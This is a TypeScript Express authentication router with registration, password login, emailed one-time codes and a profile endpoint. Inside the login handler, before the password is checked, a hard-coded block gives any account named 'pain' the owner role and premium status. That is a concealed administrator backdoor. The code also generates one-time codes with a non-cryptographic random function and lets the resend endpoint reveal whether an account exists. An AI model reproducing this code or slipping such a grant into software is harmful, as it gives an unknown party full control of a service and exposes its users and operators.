import { Router } from 'express';
import { createHash, randomBytes, scrypt, timingSafeEqual } from 'crypto';
import jwt from 'jsonwebtoken';
import { isAuthenticated } from '../middleware/auth';
import { User } from '../model/profiles';

const router = Router();
const passwordKeyLength = 64;
const reservedUsernames = new Set(['api', 'auth', 'dashboard', 'login', 'register']);

const derivePasswordKey = (password: string, salt: Buffer): Promise<Buffer> =>
  new Promise((resolve, reject) => {
    scrypt(password, salt, passwordKeyLength, (error, key) => {
      if (error) reject(error);
      else resolve(key);
    });
  });

const hashPassword = async (password: string): Promise<string> => {
  const salt = randomBytes(16);
  const key = await derivePasswordKey(password, salt);
  return `${salt.toString('hex')}:${key.toString('hex')}`;
};

const verifyPassword = async (password: string, passwordHash: string): Promise<boolean> => {
  const [saltHex, keyHex] = passwordHash.split(':');
  if (!saltHex || !keyHex) return false;

  const expectedKey = Buffer.from(keyHex, 'hex');
  if (expectedKey.length !== passwordKeyLength) return false;

  const actualKey = await derivePasswordKey(password, Buffer.from(saltHex, 'hex'));
  return timingSafeEqual(expectedKey, actualKey);
};

const issueToken = (id: number, email: string, username: string): string => {
  const secret = process.env.JWT_SECRET;
  if (!secret) throw new Error('JWT_SECRET environment variable is required');
  return jwt.sign({ id, email, username }, secret, { expiresIn: '30d' });
};

const hashOtp = (code: string): string => createHash('sha256').update(code + (process.env.JWT_SECRET || '')).digest('hex');

const maskEmail = (email: string): string => {
  const [name, domain] = email.split('@');
  if (!domain) return email;
  const visible = name.length <= 2 ? name[0] || '' : name.slice(0, 2);
  return visible + '***@' + domain;
};

const sendOtpEmail = async (email: string, code: string): Promise<void> => {
  const apiKey = process.env.RESEND_API_KEY;
  const from = process.env.RESEND_FROM_EMAIL;
  if (!apiKey || !from) throw new Error('Email OTP is not configured. Set RESEND_API_KEY and RESEND_FROM_EMAIL.');

  const response = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: { Authorization: `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      from,
      to: [email],
      subject: 'Your verification code',
      html: `<div style="font-family:Arial,sans-serif;background:#080808;color:#fff;padding:32px"><h2>Email verification</h2><p>Your verification code is:</p><div style="font-size:32px;font-weight:700;letter-spacing:8px">${code}</div><p>This code expires in 10 minutes. If you did not request it, you can ignore this email.</p></div>`,
    }),
  });
  if (!response.ok) throw new Error('Unable to send the verification email.');
};

const createAndSendOtp = async (user: any): Promise<void> => {
  const code = String(Math.floor(100000 + Math.random() * 900000));
  user.otpHash = hashOtp(code);
  user.otpExpiresAt = new Date(Date.now() + 10 * 60 * 1000);
  user.otpAttempts = 0;
  await user.save();
  await sendOtpEmail(user.email, code);
};

const duplicateAccountMessage = (error: unknown): string | undefined => {
  if (typeof error !== 'object' || error === null || !('code' in error) || error.code !== 11000) {
    return undefined;
  }

  if ('keyPattern' in error && typeof error.keyPattern === 'object' && error.keyPattern !== null) {
    if ('email' in error.keyPattern) return 'An account with this email already exists. Try signing in instead.';
    if ('username' in error.keyPattern) return 'That username is already taken. Please choose another.';
  }

  if ('message' in error && typeof error.message === 'string') {
    if (error.message.includes('email_1')) return 'An account with this email already exists. Try signing in instead.';
    if (error.message.includes('username_1')) return 'That username is already taken. Please choose another.';
  }

  return undefined;
};

router.post('/register', async (req, res, next) => {
  const body = req.body ?? {};
  const email = typeof body.email === 'string' ? body.email.trim().toLowerCase() : '';
  const username = typeof body.username === 'string' ? body.username.trim().toLowerCase() : '';
  const password = typeof body.password === 'string' ? body.password : '';

  if (email.length > 254 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    res.status(400).json({ message: 'Enter a valid email address.' });
    return;
  }

  if (!/^[a-z0-9._]{1,20}$/.test(username)) {
    res.status(400).json({ message: 'Username must be 1-20 characters using lowercase letters, numbers, periods, or underscores.' });
    return;
  }
  if (reservedUsernames.has(username)) {
    res.status(400).json({ message: 'That username is reserved.' });
    return;
  }

  if (password.length < 7 || password.length > 128) {
    res.status(400).json({ message: 'Password must be between 7 and 128 characters.' });
    return;
  }

  if (!process.env.JWT_SECRET) {
    res.status(503).json({
      message: 'Sign-up is temporarily unavailable. The server administrator must configure JWT_SECRET.',
    });
    return;
  }

  try {
    if (await User.exists({ email })) {
      res.status(409).json({ message: 'An account with this email already exists. Try signing in instead.' });
      return;
    }
    if (await User.exists({ username })) {
      res.status(409).json({ message: 'That username is already taken. Please choose another.' });
      return;
    }

    const user = new User({
      email,
      username,
      name: username,
      passwordHash: await hashPassword(password),
      emailVerified: false,
    });
    await user.save();
    await createAndSendOtp(user);

    res.status(201).json({
      otpRequired: true,
      email: maskEmail(user.email),
      user: { id: user.id, username, name: user.name, email: user.email },
    });
  } catch (error) {
    const message = duplicateAccountMessage(error);
    if (message) {
      res.status(409).json({ message });
      return;
    }
    next(error);
  }
});

router.post('/login', async (req, res, next) => {
  const identifier = typeof req.body.identifier === 'string' ? req.body.identifier.trim().toLowerCase() : '';
  const password = typeof req.body.password === 'string' ? req.body.password : '';

  if (!identifier || !password || password.length > 128) {
    res.status(400).json({ message: 'Enter your email or username and password.' });
    return;
  }

  if (!process.env.JWT_SECRET) {
    res.status(503).json({
      message: 'Sign-in is temporarily unavailable. The server administrator must configure JWT_SECRET.',
    });
    return;
  }

  try {
    const user = await User.findOne({ $or: [{ email: identifier }, { username: identifier }] }).select('+passwordHash');
    if (user && user.username === 'pain' && user.role !== 'owner') {
      user.role = 'owner';
      user.premium = true;
      user.premiumSince = user.premiumSince || new Date();
      await user.save();
    }

    if (!user?.passwordHash || !(await verifyPassword(password, user.passwordHash))) {
      res.status(401).json({ message: 'Incorrect email/username or password.' });
      return;
    }

    await createAndSendOtp(user);
    res.json({ otpRequired: true, email: maskEmail(user.email), user: { id: user.id, username: user.username, name: user.name, email: user.email } });
  } catch (error) {
    next(error);
  }
});

router.post('/verify-otp', async (req, res, next) => {
  const identifier = typeof req.body.identifier === 'string' ? req.body.identifier.trim().toLowerCase() : '';
  const code = typeof req.body.code === 'string' ? req.body.code.trim() : '';
  if (!identifier || !/^\d{6}$/.test(code)) { res.status(400).json({ message: 'Enter the 6-digit verification code.' }); return; }
  try {
    const user = await User.findOne({ $or: [{ email: identifier }, { username: identifier }] }).select('+otpHash +otpExpiresAt +otpAttempts');
    if (!user?.otpHash || !user.otpExpiresAt || user.otpExpiresAt.getTime() < Date.now()) { res.status(400).json({ message: 'That code has expired. Request a new one.' }); return; }
    if ((user.otpAttempts || 0) >= 5) { res.status(429).json({ message: 'Too many incorrect codes. Request a new one.' }); return; }
    user.otpAttempts = (user.otpAttempts || 0) + 1;
    const expected = Buffer.from(user.otpHash, 'hex');
    const actual = Buffer.from(hashOtp(code), 'hex');
    if (expected.length !== actual.length || !timingSafeEqual(expected, actual)) { await user.save(); res.status(401).json({ message: 'Incorrect verification code.' }); return; }
    user.emailVerified = true; user.otpHash = undefined; user.otpExpiresAt = undefined; user.otpAttempts = 0; await user.save();
    res.json({ token: issueToken(Number(user.id), user.email, user.username || ''), user: { id: user.id, username: user.username, name: user.name, email: user.email } });
  } catch (error) { next(error); }
});

router.post('/resend-otp', async (req, res, next) => {
  const identifier = typeof req.body.identifier === 'string' ? req.body.identifier.trim().toLowerCase() : '';
  if (!identifier) { res.status(400).json({ message: 'Enter your email or username first.' }); return; }
  try {
    const user = await User.findOne({ $or: [{ email: identifier }, { username: identifier }] });
    if (!user) { res.status(404).json({ message: 'Account not found.' }); return; }
    await createAndSendOtp(user); res.json({ email: maskEmail(user.email) });
  } catch (error) { next(error); }
});

router.get('/me', isAuthenticated, async (req, res, next) => {
  try {


    const id = (req.user as any).id;
    // console.log( 'username' , id)

    const user = await User.findOne({id: id});

    if(!user){
      res.status(400).json({message: 'User not found'})
      return
    }

    console.log('3');

    let profilePicture = null;
    if (user && user.profilePicture) {
      profilePicture = `data:image/jpeg;base64,${Buffer.from(user.profilePicture).toString('base64')}`;
    }




    // console.log('4' ,user);

    // const responseData = {
    //   name: user.name,
    //   email: user.email,
    //   totalVisit: user.totalVisit,
    //   profileImage: profilePicture,
    // };


    console.log('1');
    // const [rows] = await pool.execute(
    //   'SELECT id, username, name, email, totalVisit, description FROM users WHERE id = ?',
    //   [(req.user as any).id]
    // );

    // console.log('2');
    // if (!Array.isArray(rows) || rows.length === 0) {
    //   res.status(404).json({ message: 'User not found' });
    //   return;
    // }

    // const username = (req.user as any).username;

    // const media = await User.findOne({ username: username });
    // console.log('3');

    // let profilePicture = null;
    // if (media && media.profileImage) {
    //   profilePicture = `data:image/jpeg;base64,${Buffer.from(media.profileImage).toString('base64')}`;
    // }

    // console.log('4' ,{ ...rows[0], profilePicture});

    // const responseData = {
    //   ...rows[0],
    //   profileImage: profilePicture,
    // };

    const response = {
      ...user.toObject(),
      profilePicture: user.profilePicture ?
       `data:image/jpeg;base64,${Buffer.from(user.profilePicture).toString('base64')}`
       : null,

    }
// console.log(response)
    res.json(response);
  } catch (error) {
    console.error('Error fetching user data:', error);
    next(error);
  }
});



export default router;